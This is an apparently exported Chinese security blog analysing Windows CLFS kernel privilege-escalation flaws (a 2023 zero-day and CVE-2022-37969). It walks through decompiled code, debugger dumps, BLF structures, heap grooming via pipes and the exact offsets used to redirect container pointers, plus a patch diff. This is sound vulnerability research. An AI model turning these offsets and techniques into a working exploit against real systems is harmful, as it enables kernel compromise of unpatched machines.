ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); v8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// 获取偏移 (this+0x30h) v23 = v8; if ( v8 ) { v7 = 1; v10 = *(unsigned int *)(v8 + 40); **v11 = ++*(_QWORD *)(v10 + v8) \u0026amp; 1i64;** v12 = *((_QWORD *)this + 6); PAGE:00000001C0034202 48 8B F9 mov rdi, rcx PAGE:00000001C0034205 33 DB xor ebx, ebx PAGE:00000001C0034207 ; 24: v23 = 0i64; PAGE:00000001C0034207 48 89 5C 24 50 mov [rsp+88h+var_38], rbx PAGE:00000001C003420C ; 25: v21 = 0i64; PAGE:00000001C003420C 48 89 5C 24 40 mov [rsp+88h+var_48], rbx PAGE:00000001C0034211 ; 26: v7 = 0; PAGE:00000001C0034211 45 32 E4 xor r12b, r12b PAGE:00000001C0034214 ; 27: v24 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); PAGE:00000001C0034214 44 88 64 24 30 mov [rsp+88h+var_58], r12b PAGE:00000001C0034219 B2 01 mov dl, 1 ; Wait PAGE:00000001C003421B 48 8B 49 20 mov rcx, [rcx+20h] ; Resource PAGE:00000001C003421F 48 FF 15 8A 0E FF FF call cs:__imp_ExAcquireResourceExclusiveLite PAGE:00000001C003421F PAGE:00000001C0034226 0F 1F 44 00 00 nop dword ptr [rax+rax+00h] PAGE:00000001C003422B 88 84 24 A8 00 00 00 mov [rsp+88h+arg_18], al PAGE:00000001C003422B PAGE:00000001C0034232 PAGE:00000001C0034232 loc_1C0034232: ; DATA XREF: .rdata:00000001C0017DD0↑o PAGE:00000001C0034232 ; __try { // __finally(_CClfsBaseFilePersisted__WriteMetadataBlock____1___fin$0) PAGE:00000001C0034232 44 8B EE mov r13d, esi PAGE:00000001C0034235 48 8D 0C 75 00 00 00 00 lea rcx, ds:0[rsi*2] PAGE:00000001C003423D 48 03 CE add rcx, rsi PAGE:00000001C0034240 4C 8D 04 CD 00 00 00 00 lea r8, ds:0[rcx*8] PAGE:00000001C0034248 ; 28: v8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// 获取偏移 (this+0x30h) PAGE:00000001C0034248 48 8B 4F 30 mov rcx, [rdi+30h] PAGE:00000001C003424C 4D 8B 34 08 mov r14, [r8+rcx] PAGE:00000001C0034250 ; 29: v23 = v8; PAGE:00000001C0034250 4C 89 74 24 50 mov [rsp+88h+var_38], r14 PAGE:00000001C0034255 ; 30: if ( v8 ) PAGE:00000001C0034255 4D 85 F6 test r14, r14 PAGE:00000001C0034258 75 10 jnz short loc_1C003426A PAGE:00000001C0034258 PAGE:00000001C003425A ; 74: v9 = -1072037875; PAGE:00000001C003425A 41 BF 0D 00 1A C0 mov r15d, 0C01A000Dh PAGE:00000001C0034260 ; 75: v18 = -1072037875; PAGE:00000001C0034260 44 89 7C 24 34 mov [rsp+88h+var_54], r15d PAGE:00000001C0034265 E9 28 01 00 00 jmp loc_1C0034392 PAGE:00000001C0034265 PAGE:00000001C003426A ; --------------------------------------------------------------------------- PAGE:00000001C003426A ; 32: v7 = 1; PAGE:00000001C003426A PAGE:00000001C003426A loc_1C003426A: ; CODE XREF: CClfsBaseFilePersisted::WriteMetadataBlock(ulong,uchar)+78↑j PAGE:00000001C003426A 41 B4 01 mov r12b, 1 PAGE:00000001C003426D ; 33: v10 = *(unsigned int *)(v8 + 40); PAGE:00000001C003426D 44 88 64 24 30 mov [rsp+88h+var_58], r12b PAGE:00000001C0034272 41 8B 46 28 mov eax, [r14+28h] PAGE:00000001C0034276 ; 34: v11 = ++*(_QWORD *)(v10 + v8) \u0026amp; 1i64; PAGE:00000001C0034276 4A FF 04 30 **inc qword ptr [rax+r14]** 在zscaler对CVE-2022-37969的分析中提到过CClfsBaseFilePersisted类结构，CClfsBaseFilePersisted类的this+0x30处存储了一个指向堆缓冲区的指针，该缓冲区大小为0xa0，在缓冲区0x30偏移处存储了指向base block的指针，如下所示：\n0: kd\u0026gt; dps rdi ffffa289`156cc000 fffff800`53114020 CLFS!CClfsBaseFilePersisted::`vftable\u0026#39; ffffa289`156cc008 ffffffff`00000001 ffffa289`156cc010 00000000`00000000 ffffa289`156cc018 00000018`00000000 ffffa289`156cc020 ffffa289`1469a310 ffffa289`156cc028 00000000`19630006 ffffa289`156cc030 **ffffa289`19254810 // 堆指针** ffffa289`156cc038 ffffa289`17bfd4d0 ffffa289`156cc040 ffffe381`a8743088 ffffa289`156cc048 00000000`0000000b ffffa289`156cc050 ffffa289`156cc000 ffffa289`156cc058 ffffe381`a87430e0 ffffa289`156cc060 00000000`0000000b ffffa289`156cc068 ffffa289`156cc000 ffffa289`156cc070 ffffe381`a8743138 ffffa289`156cc078 00000000`0000000b 0: kd\u0026gt; dq ffffa289`19254810 ffffa289`19254810 ffffe381`a5c7f680 00000000`00000400 ffffa289`19254820 00000000`00000000 ffffe381`a5c7f680 ffffa289`19254830 00000400`00000400 00000000`00000001 ffffa289`19254840 **ffffe381`a8743000** 00000800`00007a00 **// 指向了base block** ffffa289`19254850 00000000`00000002 ffffe381`a8743000 ffffa289`19254860 00008200`00007a00 00000000`00000003 ffffa289`19254870 ffffe381`a5353cc0 0000fc00`00000200 ffffa289`19254880 00000000`00000004 ffffe381`a5353cc0 0: kd\u0026gt; db ffffe381`a8743000 **// base block内容** ffffe381`a8743000 15 00 01 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffe381`a8743010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffe381`a8743020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffe381`a8743030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffe381`a8743040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffe381`a8743050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffe381`a8743060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... ffffe381`a8743070 01 00 00 00 00 00 00 00-9c 06 ce e1 00 1c ee 11 ................ 0: kd\u0026gt; !pool ffffe381`a8743000 Pool page ffffe381a8743000 region is Paged pool *ffffe381a8743000 : large page allocation, tag is Clfs, size is 0x7a00 bytes Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys 回到调试器中r14和rax寄存器值分别问ffffe381a2303030和0000000000000369\n0: kd\u0026gt; rr14 r14=ffffe381a2303030 0: kd\u0026gt; rrax rax=0000000000000369 可以看出ffffe381a2303030位于主blf文件的base block + 0x30位置，rax值取自于base block + 0x30 + 0x28\n0: kd\u0026gt; db ffffe381a2303030 + 0x28 ffffe381`a2303058 69 03 00 00 00 00 00 00-00 00 00 00 00 00 00 00 i............... 所以代码会让主blf的base block + 0x30 + 0x369 = base block +0x399处的一个字节自增1，而该处和BaseLogRecord的rgContainers的高字节重叠，前面说过正常blf文件的rgContainers值为0x1470，在该处自增1后，高字节0x14自增就变为了0x15，导致该处值变为0x1570，从而导致后续定位主blf文件的container context时定位到了攻击者伪造的container context。\n这里的问题是，该处原为给10个副blf文件添加日志容器，所以按正常来讲该处定位到的应该是副blf文件的base block，而不是主blf文件的base block。回到CClfsBaseFilePersisted::WriteMetadataBlock函数中，定位base block代码如下\nv8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// 获取偏移 (this+0x30h) 其中*((_QWORD *)this + 6)为固定值(堆指针)，v4为传入WriteMetadataBlock的第二个参数，回溯到调用者，去除无关逻辑之后如下：\n__int64 __fastcall CClfsBaseFilePersisted::ExtendMetadataBlock(__int64 a1, int a2, int a3) { ..... v3 = a2; v36 = 0i64; v42 = 0i64; v34 = 0i64; ...... EventObject = CClfsBaseFile::GetControlRecord((CClfsBaseFile *)a1, \u0026amp;v34); ...... EventObject = CClfsBaseFilePersisted::FlushControlRecord((CClfsBaseFilePersisted *)a1); for ( k = EventObject; EventObject \u0026gt;= 0; k = EventObject ) { LABEL_41: if ( *v12 != 2 ) break; ...... v27 = *((unsigned __int16 *)v34 + 0xD); v28 = *((unsigned __int16 *)v34 + 0xD); if ( ((_WORD)v27 == *((_WORD *)v34 + 12) || CClfsBaseFilePersisted::IsShadowBlock(v14, v27, *((unsigned __int16 *)v34 + 12))) \u0026amp;\u0026amp; *(_DWORD *)(*(_QWORD *)(a1 + 48) + 24 * v27 + 8) \u0026gt;\u0026gt; 9 \u0026lt; *((_DWORD *)v34 + 7) ) { CClfsBaseFilePersisted::ExtendMetadataBlockDescriptor( (CClfsBaseFilePersisted *)a1, v28, *((_DWORD *)v34 + 9) \u0026gt;\u0026gt; 1); LOWORD(v27) = *v25; } CClfsBaseFilePersisted::WriteMetadataBlock((CClfsBaseFilePersisted *)a1, (unsigned __int16)v27, 0); ...... } } } } } } } } } ...... return (unsigned int)EventObject; } WriteMetadataBlock的第二个参数来源于CClfsBaseFile::GetControlRecord的第二个参数，跟进CClfsBaseFile::GetControlRecord逻辑\n__int64 __fastcall CClfsBaseFile::GetControlRecord(CClfsBaseFile *this, struct _CLFS_CONTROL_RECORD **a2) { ...... *a2 = 0i64; v13 = 0; v14 = 0; result = CClfsBaseFile::AcquireMetadataBlock(this); v5 = result; if ( (int)result \u0026gt;= 0 ) { v6 = (_DWORD *)*((_QWORD *)this + 6); // 访问this+0x30处的指针，这个指针指向了0x90大小的heap v7 = *(_QWORD *)v6; // 该段内存存储了一些内存指针，获取偏移0x0处的指针，这个指针指向了control block v8 = v6[2]; v9 = *(unsigned int *)(*(_QWORD *)v6 + 0x28i64);// 获取control block 0x28的数值 v10 = *(_QWORD *)v6 + v9; // 将control block 0x28处数值和control block相加，计算control record if ( (unsigned int)v9 \u0026lt; v8 \u0026amp;\u0026amp; (unsigned int)v9 \u0026gt;= 0x70 \u0026amp;\u0026amp; v8 - (unsigned int)v9 \u0026gt;= 0x68 ) { v11 = 24i64 * *(unsigned __int16 *)(v10 + 72); if ( v8 - (unsigned int)v9 - 80 \u0026gt;= v11 ) { if ( (g_signatureOffsetsValidation \u0026amp; 1) == 0 || (v12 = *(unsigned int *)(v7 + 104), v11 + (unsigned int)(v9 + 80) \u0026lt;= v12) \u0026amp;\u0026amp; (unsigned int)v12 \u0026lt;= v8 \u0026amp;\u0026amp; (int)RtlULongMult(*(unsigned __int16 *)(v7 + 4), 2u, \u0026amp;v13) \u0026gt;= 0 \u0026amp;\u0026amp; (int)RtlULongAdd(v12, v13, \u0026amp;v14) \u0026gt;= 0 \u0026amp;\u0026amp; v14 \u0026lt;= v8 ) { *a2 = (struct _CLFS_CONTROL_RECORD *)v10; return v5; } if ( WPP_GLOBAL_Control != \u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_DWORD *)WPP_GLOBAL_Control + 11) \u0026amp; 0x8000000) != 0 ) WPP_SF_sdLLH(*((_QWORD *)WPP_GLOBAL_Control + 3)); } } return 0xC01A000Di64; } return result; } 分析该代码，虽然this参数为CClfsBaseFile *类型，但在调用CClfsBaseFile::GetControlRecord的CClfsBaseFilePersisted::ExtendMetadataBlock函数中传入的该参数原类型为CClfsBaseFilePersisted。\n该代码最终计算a2的逻辑为从this+30处取得指针并解引用，获得control block地址，而后解引用该地址并在偏移0x28处取得一个偏移，将这个偏移和control block相加获得control record地址并赋给a2.\n在调试器中可以看到该偏移为0x70，即从control block +0x70位置定位到了control record\n0: kd\u0026gt; db ffffe381`a5c7f680 + 0x28 ffffe381`a5c7f6a8 70 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 p............... 回到CClfsBaseFilePersisted::ExtendMetadataBlock函数中，在取得control record之后，在control record+0x1a处取得值并作为第二个参数传入CClfsBaseFilePersisted::WriteMetadataBlock中，该处取得值为0x13\n0: kd\u0026gt; db ffffe381`a5c7f680 + 0x70 + 0x1a ffffe381`a5c7f70a 13 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 根据前面CClfsBaseFilePersisted::WriteMetadataBlock的逻辑可知，在第二个参数传入0x13之后计算的偏移为0x18*0x13=0x1c8，即从poi(CClfsBaseFilePersisted+0x30)+0x1c8取得值并获取poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28处的偏移。\n在前面分析CClfsBaseFilePersisted结构知道，0x30偏移处指向的堆内存大小只有0xa0\n0: kd\u0026gt; !pool ffffa289`19254810 Pool page ffffa28919254810 region is Nonpaged pool ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs ffffa28919254760 size: a0 previous size: 0 (Free) Vad *ffffa28919254800 size: a0 previous size: 0 (Allocated) *Clfs Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs ffffa28919254940 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 当使用0x1c8访问时会产生越界，此时读取到的实际是使用pipe WriteFile时申请的堆，此前通过pipe写入了主blf文件的base block+0x30，所以该处读取到的地址实际上是主blf文件的base block + 0x30。\n经过poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28运算会取到主blf文件的base block + 0x58的位置，而该位置值已经被修改为了0x369.\n0: kd\u0026gt; dq ffffa289`19254810 + 0x1c8 ffffa289`192549d8 ffffe381`a2303030 7246704e`0a0a0000 ffffa289`192549e8 5e85fe62`4567d0ee ffffe381`a9cb4258 ffffa289`192549f8 ffffe381`a9cb4258 00000000`00000000 ffffa289`19254a08 ffffe381`a90c79c0 00000060`00000000 ffffa289`19254a18 00000000`00000060 ffffe381`a2303030 ffffa289`19254a28 ffffe381`a2303030 ffffe381`a2303030 ffffa289`19254a38 ffffe381`a2303030 ffffe381`a2303030 ffffa289`19254a48 ffffe381`a2303030 ffffe381`a2303030 0: kd\u0026gt; !pool ffffa289`19254810+0x1c8 Pool page ffffa289192549d8 region is Nonpaged pool ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs ffffa28919254760 size: a0 previous size: 0 (Free) Vad ffffa28919254800 size: a0 previous size: 0 (Allocated) Clfs ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs *ffffa28919254940 size: a0 previous size: 0 (Allocated) *NpFr Process: ffffa28915324300 Pooltag NpFr : DATA_ENTRY records (read/write buffers), Binary : npfs.sys ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 之后通过运算poi(0x369+ base block + 0x30)++实际上让主blf文件的base block+0x399自增1。最终在对主blf文件调用CreateLogFile是定位到的container context偏移为0x1570，找到了攻击者伪造的恶意contener context，在通过pContainer对象执行到了用户层内存0x5000000之中。\n补丁分析\nWin10 21H2\ndiff补丁，可发现补丁主要修改了CClfsBaseFile::GetControlRecord、CClfsBaseFile::AcquireMetadataBlock，同时新增了一个函数CClfsLogFcbPhysical::ValidateScratchBlockOffsets，在CClfsLogFcbPhysical::SetEndOfLog和CClfsLogFcbPhysical::RecoverTruncateLog中引用。\nWin11 21H2\n小结\n在CVE-2022-37969中是通过前一个blf文件的错误的cbSymbolZone修改了下一个blf文件的conteiner context的pContaienr对象指针，从而在后续定位CClfsContainer对象时访问到了用户层内存，达成攻击流程，该漏洞利用需要通过循环创建blf文件来达到稳定的堆内存结构，从而使得后续可以成功修改后面的blf文件的conteiner context。\n在CVE-2022-37969补丁中增加了对client context、cbSymbolZone越界检测，从而不能直接通过这种方法损坏conteiner context对象指针。\n在本次漏洞利用中，巧妙地通过伪造control record的数据来造成越界读取，从而修改另外的base block数据，该处修改是通过指针定位到指定的内存，所以不用像CVE-2022-37969中通过反复创建blf文件来达成一种稳定的内存间隙状态，但利用过程中仍然需要通过布局内存使得在越界读取时读取到的是指定的内存地址。\n参考链接\nhttps://www.secrss.com/articles/54881\nhttps://www.anquanke.com/post/id/288808\nhttps://securelist.com/nokoyawa-ransomware-attacks-with-windows-zero-day/109483/\nCreated at 2023-05-31T19:44:15+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/","title":"CVE-2022-37969","tags":["漏洞分析"],"description":"","content":"基本信息 blf日志文件结构\n基本日志块存储了基本日志文件关联的客户端和容器上下文信息\n基本日志块由6个meta数据块组成，分别是控制块、基本块、截断块以及对应的shadow块，每个块由日志块头开始，大小为0x70 bytes\n日志块头定义：\ntypedef struct _CLFS_LOG_BLOCK_HEADER { UCHAR MajorVersion; UCHAR MinorVersion; UCHAR Usn; CLFS_CLIENT_ID ClientId; USHORT TotalSectorCount; USHORT ValidSectorCount; ULONG Padding; ULONG Checksum; ULONG Flags; CLFS_LSN CurrentLsn; CLFS_LSN NextLsn; ULONG RecordOffsets[16]; ULONG SignaturesOffset; } CLFS_LOG_BLOCK_HEADER, *PCLFS_LOG_BLOCK_HEADER; 内存布局\nSignatureOffset是了在内存中存储每个扇区签名的数组的偏移。扇区签名位于每个扇区的末尾，大小两个字节，由扇区块类型（1 字节）和 USN（1 字节）组成。每个扇区大小为0x200。\n在BLF文件中，基本块从偏移0x800开始，到0x81FF，以日志块头开始，然后是基本记录头\n基本记录头定义如下,大小为1338，到偏移1BA8处\ntypedef struct _CLFS_METADATA_RECORD_HEADER { ULONGLONG ullDumpCount; } CLFS_METADATA_RECORD_HEADER, * PCLFS_METADATA_RECORD_HEADER; typedef struct _CLFS_BASE_RECORD_HEADER { CLFS_METADATA_RECORD_HEADER hdrBaseRecord; CLFS_LOG_ID cidLog; ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE]; ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE]; ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE]; ULONG cNextContainer; CLFS_CLIENT_ID cNextClient; ULONG cFreeContainers; ULONG cActiveContainers; ULONG cbFreeContainers; ULONG cbBusyContainers; ULONG rgClients[MAX_CLIENTS_DEFAULT]; ULONG rgContainers[MAX_CONTAINERS_DEFAULT]; ULONG cbSymbolZone; ULONG cbSector; USHORT bUnused; CLFS_LOG_STATE eLogState; UCHAR cUsn; UCHAR cClients; } CLFS_BASE_RECORD_HEADER, * PCLFS_BASE_RECORD_HEADER; 内存布局：\n此次漏洞重点字段：\nrgContainers\n存储了CLFS_CONTAINER_CONTEXT数组相对于基本块的偏移\nrgClients\n存储了_CLFS_CLIENT_CONTEXT 数组相对于基本块的偏移\ncbSymbolZone\n表示符号区中下一个可用的空闲偏移量，用于存储新符号。\n基本记录中，client context, container context, shared security context由symbols表示，在symbols前面是CLFSHASHSYM结构\ntypedef struct _CLFS_NODE_ID { ULONG cType; ULONG cbNode; } CLFS_NODE_ID, *PCLFS_NODE_ID; typedef struct _CLFSHASHSYM { CLFS_NODE_ID cidNode; ULONG ulHash; ULONG cbHash; ULONGLONG ulBelow; ULONGLONG ulAbove; LONG cbSymName; LONG cbOffset; BOOLEAN fDeleted; } CLFSHASHSYM, *PCLFSHASHSYM; 内存布局\n在基本记录中，client context标示一个日志文件的client。client context结构如下\ntypedef struct _CLFS_NODE_ID { ULONG cType; ULONG cbNode; } CLFS_NODE_ID, *PCLFS_NODE_ID; typedef struct _CLFS_CLIENT_CONTEXT { CLFS_NODE_ID cidNode; CLFS_CLIENT_ID cidClient; USHORT fAttributes; ULONG cbFlushThreshold; ULONG cShadowSectors; ULONGLONG cbUndoCommitment; LARGE_INTEGER llCreateTime; LARGE_INTEGER llAccessTime; LARGE_INTEGER llWriteTime; CLFS_LSN lsnOwnerPage; CLFS_LSN lsnArchiveTail; CLFS_LSN lsnBase; CLFS_LSN lsnLast; CLFS_LSN lsnRestart; CLFS_LSN lsnPhysicalBase; CLFS_LSN lsnUnused1; CLFS_LSN lsnUnused2; CLFS_LOG_STATE eState; //+0x78 union { HANDLE hSecurityContext; ULONGLONG ullAlignment; }; } CLFS_CLIENT_CONTEXT, *PCLFS_CLIENT_CONTEXT; container context结构和日志文件添加容器有关，container context结构\ntypedef struct _CLFS_CONTAINER_CONTEXT { CLFS_NODE_ID cidNode; //8 bytes ULONGLONG cbContainer; //8 bytes CLFS_CONTAINER_ID cidContainer; // 4 bytes CLFS_CONTAINER_ID cidQueue; // 4 bytes union { CClfsContainer* pContainer; //8 bytes ULONGLONG ullAlignment; }; CLFS_USN usnCurrent; CLFS_CONTAINER_STATE eState; ULONG cbPrevOffset; //4 bytes ULONG cbNextOffset; //4 bytes } CLFS_CONTAINER_CONTEXT, *PCLFS_CONTAINER_CONTEXT; 内存布局\n其中pContainer是指向CClfsContainer对象的指针\n漏洞点\n该处获取通过GetBaseLogRecord函数获取BaseLogRecord，之后的cbSymbolZone，判断cbSymbolZone+v4是否大于SignaturesOffset的，如果判断通过则通过memset将BaseLogRecord+cbSymbolZone内存清零，大小为v4。\n__int64 __fastcall CClfsBaseFilePersisted::AllocSymbol(CClfsBaseFilePersisted *this, unsigned int a2, void **a3) { __int64 v4; // rbp CLFS_BASE_RECORD_HEADER *BaseLogRecord; // rax __int64 v6; // r8 this指针 CLFS_BASE_RECORD_HEADER *v7; // rdi CLFS_LOG_BLOCK_HEADER *v8; // rcx __int64 cbSymbolZone; // r8 char *v10; // rbx __int64 result; // rax v4 = a2; BaseLogRecord = (CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); v7 = BaseLogRecord; if ( !BaseLogRecord ) return 3222929421i64; v8 = *(CLFS_LOG_BLOCK_HEADER **)(*(_QWORD *)(v6 + 48) + 48i64); *a3 = 0i64; cbSymbolZone = BaseLogRecord-\u0026gt;cbSymbolZone; if ( (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8+ v8-\u0026gt;SignaturesOffset) ) return 3221225507i64; // ffff970a`4995b000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... // ffff970a`4995b010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ // ffff970a`4995b020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... // ffff970a`4995b030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ // ffff970a`4995b040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ // ffff970a`4995b050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ // ffff970a`4995b060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... // ffff970a`4995b070 05 00 00 00 00 00 00 00-aa fb b6 33 fa f9 ed 11 ...........3.... v10 = (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone; memset(v10, 0, (unsigned int)v4); v7-\u0026gt;cbSymbolZone += v4; result = 0i64; *a3 = v10; return result; } 影响版本 略\n环境搭建 Windows 10 21H2 windbg 技术分析\u0026amp;调试 基于该漏洞点有两种利用方式，第一种将cbSymbolZone修改为自身的CLFS_CONTAINER_CONTEXT-\u0026gt;pContainer结构偏移，由于CLFS_CONTAINER_CONTEXT内存有Container context对象指针。使用memset清空该指针，当解引用该指针将触发异常，导致蓝屏。\n第二种将cbSymbolZone 修改为下个BLF文件的CLFS_CONTAINER_CONTEXT-\u0026gt;pContainer结构偏移，利用漏洞将该指针清零，解引用第二个BLF文件的CLFS_CONTAINER_CONTEXT-\u0026gt;pContainer 将导致蓝屏，这种方式利用需要绕过(char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8+ v8-\u0026gt;SignaturesOffset)\n第一种利用方式\n在调试中发现CLFS_CONTAINER_CONTEXT结构距离CLFS_BASE_RECORD_HEADER结束为0x128，pContainer指针距离CLFS_BASE_RECORD_HEADER为0x130，此处要清空高四位（内核解引用指针会校验指针是否为NULL，所以不能把所有的位都清零），则应设为144。\n1: kd\u0026gt; dq ffff970a4995c4d0 ffff970a`4995c4d0 00000030`c1fdf008 00000000`00080000 ffff970a`4995c4e0 00000000`00000000 00000000`45f7cd40 ffff970a`4995c4f0 00000000`00000000 00000000`00000000 ffff970a`4995c500 00000000`00000000 00000000`00000000 ffff970a`4995c510 00000000`00000000 00000000`00000000 ffff970a`4995c520 00000000`00000000 00000000`00000000 ffff970a`4995c530 00000000`00000000 00000000`00000000 ffff970a`4995c540 00000000`00000000 00000000`00000000 1: kd\u0026gt; rr8 r8=000000000000000c 1: kd\u0026gt; rrdi rdi=ffff970a4995b070 1: kd\u0026gt; ?ffff970a`4995c4d0-ffff970a4995b070 Evaluate expression: 5216 = 00000000`00001460 1: kd\u0026gt; ?00000000`00001460-0x1338 Evaluate expression: 296 = 00000000`00000128 在clfs!CClfsBaseFilePersisted::AllocSymbol下断点，运行PoC\nbp clfs!CClfsBaseFilePersisted::AllocSymbol CLFS!CClfsBaseFilePersisted::AllocSymbol通过调用CLFS!CClfsBaseFile::GetBaseLogRecord获取到了基本记录头，可以看到_CLFS_BASE_RECORD_HEADER→cbSymbolZone已被设为144\n1: kd\u0026gt; db rax ffffbd84`4f383070 05 00 00 00 00 00 00 00-a1 a9 21 b4 31 0f ee 11 ..........!.1... ffffbd84`4f383080 bc 69 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 .i..)..2........ ffffbd84`4f383090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830a0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830c0 00 00 00 00 00 00 00 00-38 13 00 00 00 00 00 00 ........8....... ffffbd84`4f3830d0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; db rax + 0x1328 ffffbd84`4f384398 44 01 00 00 00 00 00 00-00 00 03 01 01 00 00 00 D............... ffffbd84`4f3843a8 06 f0 fd c1 30 00 00 00-16 00 d2 02 b8 00 00 00 ....0........... ffffbd84`4f3843b8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3843c8 f0 13 00 00 68 13 00 00-00 00 00 00 00 00 00 00 ....h........... ffffbd84`4f3843d8 07 f0 fd c1 88 00 00 00-00 00 00 01 40 9c 00 00 ............@... ffffbd84`4f3843e8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3843f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f384408 00 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ 